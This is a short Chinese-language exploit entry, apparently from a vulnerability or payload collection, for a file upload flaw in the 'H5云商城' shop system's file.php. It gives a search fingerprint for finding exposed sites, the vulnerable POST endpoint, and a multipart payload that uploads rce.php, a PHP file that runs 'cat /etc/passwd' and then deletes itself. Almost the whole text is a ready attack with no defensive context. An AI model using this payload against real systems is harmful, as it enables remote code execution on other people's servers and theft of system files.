# H5云商城file.php文件上传漏洞

H5云商城file.php ｜ 文件上传 ｜ —
- **指纹**：`body="/public/qbsp.php"`
- **请求**：`POST /admin/commodtiy/file.php?upload=1 HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: application/octet-stream
<?php system("cat /etc/passwd");unlink(__FILE__);?>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
```